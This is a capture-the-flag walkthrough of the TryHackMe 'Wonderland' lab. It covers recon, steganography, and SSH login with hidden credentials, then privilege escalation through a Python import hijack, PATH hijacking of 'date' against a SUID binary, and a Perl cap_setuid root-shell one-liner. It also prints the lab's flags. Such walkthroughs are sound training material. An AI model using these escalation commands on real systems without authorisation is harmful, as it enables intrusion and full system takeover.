# Wonderland

Fall down the rabbit hole and enter wonderland.

Enter Wonderland and capture the flags.

# #1 - Obtain the flag in user.txt

*Hint: Everything is upside down here.*

## Recon

Let's start with a Nmap scan.

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

The server is hosting 2 ports, SSH (22) and HTTP (80). There is no `robots.txt` file to disclose hidden locations. Let's see what dirsearch is finding.

~~~
$ /data/src/dirsearch/dirsearch.py -u http://10.10.125.113/ -E -w /data/src/wordlists/directory-list-2.3-medium.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 220529

Error Log: /data/src/dirsearch/logs/errors-20-06-11_12-54-47.log

Target: http://10.10.125.113/

[12:54:47] Starting: 
[12:54:47] 200 -  402B  - /
[12:54:48] 301 -    0B  - /img  ->  img/
[12:54:49] 301 -    0B  - /r  ->  r/
[12:56:16] 301 -    0B  - /poem  ->  poem/
[12:56:28] 301 -    0B  - /http%3A%2F%2Fwww  ->  /http:/www
[12:58:49] 301 -    0B  - /http%3A%2F%2Fyoutube  ->  /http:/youtube
[12:59:47] 301 -    0B  - /http%3A%2F%2Fblogs  ->  /http:/blogs
[12:59:56] 301 -    0B  - /http%3A%2F%2Fblog  ->  /http:/blog
[13:00:44] 301 -    0B  - /%2A%2Ahttp%3A%2F%2Fwww  ->  /%2A%2Ahttp:/www
[13:08:19] 301 -    0B  - /http%3A%2F%2Fcommunity  ->  /http:/community
[13:09:02] 301 -    0B  - /http%3A%2F%2Fradar  ->  /http:/radar
[13:11:01] 301 -    0B  - /http%3A%2F%2Fjeremiahgrossman  ->  /http:/jeremiahgrossman
[13:11:01] 301 -    0B  - /http%3A%2F%2Fweblog  ->  /http:/weblog
[13:11:06] 301 -    0B  - /http%3A%2F%2Fswik  ->  /http:/swik
~~~

We have discovered 3 interesting locations (the rest can be ignored):
* `/img`: 3 images are there, we'll check that later
* `/r`: this will be the beginning of our rabbit chasing, we'll see that just after
* `/poem`: this is a poem, and we actually don't need it.

## Main page

Now, let's see what the home page looks like:

~~~
$ curl -s http://10.10.125.113
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Follow the White Rabbit.</h1>
    <p>"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)</p>
    <img src="/img/white_rabbit_1.jpg" style="height: 50rem;">
</body>
~~~

There might be something to get from the image:

~~~
$ wget http://10.10.125.113/img/white_rabbit_1.jpg
$ steghide info white_rabbit_1.jpg 
"white_rabbit_1.jpg":
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to "hint.txt".
$ cat hint.txt 
follow the r a b b i t
~~~

## Follow the rabbit

Dirsearch found a `/r` directory, which is the first letter of "rabbit". Let's follow the `r a b b i t`:

~~~
$ curl -s http://10.10.125.113/r/a/b/b/i/t/
<!DOCTYPE html>

<head>
    <title>Enter wonderland</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>

<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>$ 
~~~

## SSH connection

There are credentials in a hidden section of the source code: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`. Let's try to connect as `alice`:

~~~
$ ssh alice@10.10.125.113

alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ ls -la
total 40
drwxr-xr-x 5 alice alice 4096 May 25 17:52 .
drwxr-xr-x 6 root  root  4096 May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
drwx------ 2 alice alice 4096 May 25 16:37 .cache
drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
~~~

No user flag (usually `user.txt`) but a root flag (`root.txt`). Seriously? Remember the hint, everything is upside down. Wouldn't the user flag be in `/root`?

~~~
alice@wonderland:~$ ls -l /root/user.txt
-rw-r--r-- 1 root root 32 May 25 16:40 /root/user.txt
alice@wonderland:~$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
~~~

User flag: `thm{"Curiouser and curiouser!"}`

# #2 Escalate your privileges, what is the flag in root.txt?

## From alice to rabbit

Checking the `/home` subdirectories, we discover that there are other users (something to keep in mind as we will likely need to switch from alice to another user):

~~~
alice@wonderland:~$ ls -la /home
total 24
drwxr-xr-x  6 root      root      4096 May 25 17:52 .
drwxr-xr-x 23 root      root      4096 May 25 00:23 ..
drwxr-xr-x  5 alice     alice     4096 May 25 17:52 alice
drwxr-x---  3 hatter    hatter    4096 May 25 22:56 hatter
drwxr-x---  2 rabbit    rabbit    4096 May 25 17:58 rabbit
drwxr-x---  6 tryhackme tryhackme 4096 May 25 22:59 tryhackme
~~~

There is a python script in Alice's home:

~~~
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

[REDACTED]

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
~~~

The script is parsing a poem, taking 10 lines randomly and displaying them:

~~~
alice@wonderland:~$ python3 walrus_and_the_carpenter.py 
The line was:	 Walked on a mile or so,
The line was:	 The Carpenter said nothing but
The line was:	 "That they could get it clear?"
The line was:	 Were walking close at hand;
The line was:	 We can begin to feed."
The line was:	 Those of the largest size.
The line was:	 They said, "it would be grand!"
The line was:	 All eager for the treat:
The line was:	 And why the sea is boiling hot —
The line was:	 "It seems a shame," the Walrus said,
~~~

Checking our privileges reveals that we can execute the `walrus_and_the_carpenter.py` script as rabbit using sudo.:

~~~
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
~~~

Well, at this stage, the only possibility seems to hijack the `import random` statement from the python script to import our own library.

Let's hook the import as follows:

~~~
alice@wonderland:~$ cd /home/alice/
alice@wonderland:~$ cat > random.py << EOF
import os
os.system("/bin/bash")
EOF
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
[sudo] password for alice: 
rabbit@wonderland:~$ whoami
rabbit
~~~

## From rabbit to hatter

Still no flag, and another challenge to solve:

~~~
rabbit@wonderland:/home/rabbit$ ll
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25 17:58 ./
drwxr-xr-x 6 root   root    4096 May 25 17:52 ../
lrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty*
rabbit@wonderland:/home/rabbit$ file teaParty
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Thu, 11 Jun 2020 13:29:28 +0000
Ask very nicely, and I will give you some tea while you wait for him
tea
Segmentation fault (core dumped)
~~~

Let's download the file to analyze it locally. You can do that by running a python web server from `/home/rabbit` (`python -m http.server`) and by downloading it with wget on your machine (`wget http://10.10.125.113:8000/teaParty`).

Below is the pseudo c code displayed by Hopper:

```c
void main() {
    setuid(0x3eb);
    setgid(0x3eb);
    puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
    system("/bin/echo -n 'Probably by ' && date --date='next hour' -R");
    puts("Ask very nicely, and I will give you some tea while you wait for him");
    getchar();
    puts("Segmentation fault (core dumped)");
    return;
}
```

As we can see, the executable will display a fake segmentation fault message. It is run as root and has the SUID bit set. It manipulates the `date` function to echo the current datetime + 1 hour. This is likely something we can exploit by hooking the date function.

~~~
rabbit@wonderland:/home/rabbit$ cat > date << EOF
#!/bin/bash
/bin/bash
EOF
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
hatter@wonderland:/home/rabbit$ 
hatter@wonderland:/home/rabbit$ whoami
hatter
~~~

## From hatter to root (privesc)

Now that we have successfully switched to the `hatter` user, let's check what we have in our home directory:

~~~
hatter@wonderland:/home/rabbit$ cd /home/hatter/
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
~~~

This is our password. We can check our privileges, but we have none, actually:

~~~
hatter@wonderland:/home/hatter$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
~~~

Also checked crontab, but we have none, checked the files owned by hatter, nothing we can exploit. Let's upload [linpeas](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh). Make sure you run all tests (`linpeas.sh -a`).

The interesting stuff is about Perl:

~~~
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
~~~

Go to https://gtfobins.github.io/gtfobins/perl/ to check the capabilities section of Perl. Let's get root access:

~~~
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# whoami
root
root@wonderland:~# cat /home/alice/root.txt 
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
~~~

Root flag: `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`
